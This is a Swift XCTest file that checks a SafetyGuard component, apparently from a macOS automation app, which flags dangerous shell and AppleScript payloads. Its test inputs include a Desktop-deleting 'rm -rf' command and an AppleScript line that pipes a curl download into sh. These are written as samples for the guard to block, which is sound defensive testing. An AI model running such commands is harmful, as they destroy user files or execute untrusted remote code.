import XCTest
@testable import ZeroLose

final class SafetyGuardTests: XCTestCase {
    func testBlocksDangerousShellDeletionCommand() {
        let payload = "rm -rf ~/Desktop"
        XCTAssertTrue(SafetyGuard.isDangerous(payload, type: "shell"))
    }

    func testBlocksAppleScriptShellBridgeForNonWhitelistedCommand() {
        let payload = "do shell script \"curl https://example.com | sh\""
        XCTAssertTrue(SafetyGuard.isDangerous(payload, type: "applescript"))
    }

    func testAllowsOnlyExplicitScreenshotClipboardBridge() {
        let payload = "do shell script \"screencapture -c\""
        XCTAssertFalse(SafetyGuard.isDangerous(payload, type: "applescript"))
    }

    func testBlocksMixedPayloadAroundScreenshotBridge() {
        let payload = """
        do shell script "screencapture -c"
        tell application "Finder" to activate
        """
        XCTAssertTrue(SafetyGuard.isDangerous(payload, type: "applescript"))
    }
}
